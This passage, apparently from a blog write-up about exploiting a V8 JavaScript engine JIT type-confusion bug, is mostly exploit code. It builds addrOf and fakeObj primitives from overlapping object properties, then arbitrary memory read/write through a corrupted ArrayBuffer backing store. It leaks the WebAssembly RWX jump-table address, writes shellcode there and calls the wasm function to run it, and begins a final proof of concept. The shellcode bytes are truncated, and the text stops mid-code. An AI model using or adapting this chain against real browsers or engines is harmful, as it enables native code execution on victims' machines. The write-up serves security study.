class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;127&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;130&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;132&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;112&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;131&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;129&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;145&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;101&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;111&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;114&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;121&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;97&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;105&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;110&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;138&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;132&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;]);
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; wasmModule = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; WebAssembly.Module(wasmCode);
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; wasmInstance = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; WebAssembly.Instance(wasmModule);
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; func = wasmInstance.exports.main;&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;3-Leak-the-RWX-jump-table-pointer&#34;&gt;&lt;a href=&#34;#3-Leak-the-RWX-jump-table-pointer&#34; class=&#34;headerlink&#34; title=&#34;[3] Leak the RWX jump-table pointer&#34;&gt;&lt;/a&gt;[3] Leak the RWX jump-table pointer&lt;/h3&gt;&lt;p&gt;Using our primitive, obtain the wasm instance&amp;#x2019;s address and the jump-table start pointer.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Leak WebAssembly Instance Address and Jump Table Start Pointer&lt;/span&gt;
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Leaking WebAssembly Instance Address...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; wasmInstanceAddr = memory.addrOf(wasmInstance);
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] WebAssembly Instance Address @ 0x&lt;span class=&#34;hljs-subst&#34;&gt;${wasmInstanceAddr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)}&lt;/span&gt;`&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; wasmRWXAddr = memory.read64(wasmInstanceAddr + &lt;span class=&#34;hljs-number&#34;&gt;0xF0n&lt;/span&gt;);
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] WebAssembly RWX Jump Table Address @ 0x&lt;span class=&#34;hljs-subst&#34;&gt;${wasmRWXAddr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)}&lt;/span&gt;`&lt;/span&gt;);&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;4-Inject-shellcode&#34;&gt;&lt;a href=&#34;#4-Inject-shellcode&#34; class=&#34;headerlink&#34; title=&#34;[4] Inject shellcode&#34;&gt;&lt;/a&gt;[4] Inject shellcode&lt;/h3&gt;&lt;p&gt;Read the jump-table pointer at offset &lt;code&gt;0xf0&lt;/code&gt; from the &lt;code&gt;wasmInstance&lt;/code&gt; object to obtain the RWX address. Use &lt;code&gt;read64&lt;/code&gt; to get the executable address, then write your shellcode there.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Leak WebAssembly Instance Address and Jump Table Start Pointer&lt;/span&gt;
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Leaking WebAssembly Instance Address...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; wasmInstanceAddr = memory.addrOf(wasmInstance);
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] WebAssembly Instance Address @ 0x&lt;span class=&#34;hljs-subst&#34;&gt;${wasmInstanceAddr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)}&lt;/span&gt;`&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; wasmRWXAddr = memory.read64(wasmInstanceAddr + &lt;span class=&#34;hljs-number&#34;&gt;0xF0n&lt;/span&gt;);
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] WebAssembly RWX Jump Table Address @ 0x&lt;span class=&#34;hljs-subst&#34;&gt;${wasmRWXAddr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)}&lt;/span&gt;`&lt;/span&gt;);

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Preparing Shellcode...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-comment&#34;&gt;// Prepare Calc Shellcode&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; shellcode = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Uint8Array&lt;/span&gt;([&lt;span class=&#34;hljs-number&#34;&gt;0x48&lt;/span&gt;,...

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Writing Shellcode to Jump Table Address...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-comment&#34;&gt;// Write Shellcode to Jump Table Start Address&lt;/span&gt;
memory.write(wasmRWXAddr, shellcode);&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;5-Call-the-wasm-function-to-execute-the-shellcode&#34;&gt;&lt;a href=&#34;#5-Call-the-wasm-function-to-execute-the-shellcode&#34; class=&#34;headerlink&#34; title=&#34;[5] Call the wasm function to execute the shellcode&#34;&gt;&lt;/a&gt;[5] Call the wasm function to execute the shellcode&lt;/h3&gt;&lt;p&gt;Finally, call the wasm function (&lt;code&gt;main&lt;/code&gt;). Since the jump table now points to our shellcode, invoking the function will execute it.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Execute our Shellcode&lt;/span&gt;
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Popping Calc...&amp;quot;&lt;/span&gt;);
func();&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This completes the chain from a JavaScript-initiated bug to native code execution.&lt;/p&gt;
&lt;p&gt;Below is the final PoC reflecting the above steps.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;As mentioned in Part 1, these tests were performed on Linux. To port the PoC from Windows to Linux you only need to change the shellcode. I replaced the Windows calc shellcode with a shell-launching shellcode and executed it on Linux.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Conversion Buffers&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; floatView = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Float64Array&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; uint64View = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; BigUint64Array(floatView.buffer);

&lt;span class=&#34;hljs-built_in&#34;&gt;Number&lt;/span&gt;.prototype.toBigInt = &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;toBigInt&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{
    floatView[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;;
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; uint64View[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;];
};

BigInt.prototype.toNumber = &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;toNumber&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{
    uint64View[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;;
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; floatView[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;];
};

&lt;span class=&#34;hljs-comment&#34;&gt;// Function that creates an object with one in-line and 32 out-of-line properties&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;makeObj&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;pValues&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; obj = {
        inline: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;
    };
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-built_in&#34;&gt;Object&lt;/span&gt;.defineProperty(obj, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;p&amp;apos;&lt;/span&gt; + i, {
            writable: &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;,
            value: pValues[i]
        });
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; obj;
}

&lt;span class=&#34;hljs-comment&#34;&gt;// Function to find overlapping properties&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; p1, p2;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;findOverlappingProperties&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pNames = [];
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        pNames[i] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;p&amp;apos;&lt;/span&gt; + i;
    }

    &lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;        function vuln(obj) {&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            obj.inline;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            this.Object.create(obj);&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            &lt;span class=&#34;hljs-subst&#34;&gt;${pNames.map((p) =&amp;gt; &lt;span class=&#34;hljs-string&#34;&gt;`let &lt;span class=&#34;hljs-subst&#34;&gt;${p}&lt;/span&gt; = obj.&lt;span class=&#34;hljs-subst&#34;&gt;${p}&lt;/span&gt;;`&lt;/span&gt;).join(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\n&amp;apos;&lt;/span&gt;)}&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            return [&lt;span class=&#34;hljs-subst&#34;&gt;${pNames.join(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;, &amp;apos;&lt;/span&gt;)}&lt;/span&gt;];&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;        }&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    `&lt;/span&gt;);

    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pValues = [];
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;; i++) {
        pValues[i] = -i;
    }

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; i &amp;lt; res.length; i++) {
            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (i !== -res[i] &amp;amp;&amp;amp; res[i] &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; res[i] &amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;-32&lt;/span&gt;) {
                [p1, p2] = [i, -res[i]];
                &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;;
            }
        }
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] Failed to find overlapping properties&amp;quot;&lt;/span&gt;;
}

&lt;span class=&#34;hljs-comment&#34;&gt;// Return address of an object as a BigInt&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;addrOf&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;obj&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;        function vuln(obj) {&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            obj.inline;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            this.Object.create(obj);&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            return obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x1;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;        }&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    `&lt;/span&gt;);

    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pValues = [];
    pValues[p1] = { &lt;span class=&#34;hljs-attr&#34;&gt;x1&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;, &lt;span class=&#34;hljs-attr&#34;&gt;x2&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.38&lt;/span&gt; };
    pValues[p2] = { &lt;span class=&#34;hljs-attr&#34;&gt;y&lt;/span&gt;: obj };

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (res != &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;) {
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; res.toBigInt() - &lt;span class=&#34;hljs-number&#34;&gt;1n&lt;/span&gt;;
        }
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] AddrOf Primitive Failed&amp;quot;&lt;/span&gt;;
}

&lt;span class=&#34;hljs-comment&#34;&gt;// Function to write data to obj address&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;fakeObj&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;obj, newValue&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;        function vuln(obj) {&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            obj.inline;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            this.Object.create(obj);&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            let orig = obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x2;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x2 = &lt;span class=&#34;hljs-subst&#34;&gt;${newValue.toNumber()}&lt;/span&gt;;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;            return orig;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;        }&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    `&lt;/span&gt;);

    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pValues = [];
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; o = { &lt;span class=&#34;hljs-attr&#34;&gt;x1&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;, &lt;span class=&#34;hljs-attr&#34;&gt;x2&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.38&lt;/span&gt; };
    pValues[p1] = o;
    pValues[p2] = obj;

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        o.x2 = &lt;span class=&#34;hljs-number&#34;&gt;13.38&lt;/span&gt;;
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (res != &lt;span class=&#34;hljs-number&#34;&gt;13.38&lt;/span&gt;) {
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; res.toBigInt();
        }
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] fakeObj Primitive Failed&amp;quot;&lt;/span&gt;;
}

&lt;span class=&#34;hljs-comment&#34;&gt;// Find Overlapping Properties&lt;/span&gt;
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Finding Overlapping Properties...&amp;quot;&lt;/span&gt;);
findOverlappingProperties();
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] Properties p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt; and p&lt;span class=&#34;hljs-subst&#34;&gt;${p2}&lt;/span&gt; overlap!`&lt;/span&gt;);

&lt;span class=&#34;hljs-comment&#34;&gt;// Create Array Buffers&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; arrBuf1 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ArrayBuffer&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1024&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; arrBuf2 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ArrayBuffer&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1024&lt;/span&gt;);

&lt;span class=&#34;hljs-comment&#34;&gt;// Leak Address of arrBuf2&lt;/span&gt;
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Leaking ArrayBuffer Address...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; arrBuf2Addr = addrOf(arrBuf2);
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] ArrayBuffer Address @ 0x&lt;span class=&#34;hljs-subst&#34;&gt;${arrBuf2Addr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)}&lt;/span&gt;`&lt;/span&gt;);

&lt;span class=&#34;hljs-comment&#34;&gt;// Corrupt Backing Store Pointer of arrBuf1&lt;/span&gt;
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Corrupting ArrayBuffer Backing Store...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; originalArrBuf1BackingStore = fakeObj(arrBuf1, arrBuf2Addr);

&lt;span class=&#34;hljs-comment&#34;&gt;// Store Original Backing Store Pointer of arrBuf2&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; view1 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; BigUint64Array(arrBuf1);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; originalArrBuf2BackingStore = view1[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;];

&lt;span class=&#34;hljs-comment&#34;&gt;// Memory Read and Write Primitives&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; memory = {
    write(addr, bytes) {
        view1[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = addr;
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; view2 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Uint8Array&lt;/span&gt;(arrBuf2);
        view2.set(bytes);
    },
    read64(addr) {
        view1[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = addr;
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; view2 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; BigUint64Array(arrBuf2);
        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; view2[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;];
    },
    write64(addr, ptr) {
        view1[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = addr;
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; view2 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; BigUint64Array(arrBuf2);
        view2[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = ptr;
    },
    addrOf(obj) {
        arrBuf2.leakMe = obj;
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; props = &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.read64(arrBuf2Addr + &lt;span class=&#34;hljs-number&#34;&gt;8n&lt;/span&gt;) - &lt;span class=&#34;hljs-number&#34;&gt;1n&lt;/span&gt;;
        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.read64(props + &lt;span class=&#34;hljs-number&#34;&gt;16n&lt;/span&gt;) - &lt;span class=&#34;hljs-number&#34;&gt;1n&lt;/span&gt;;
    }
};

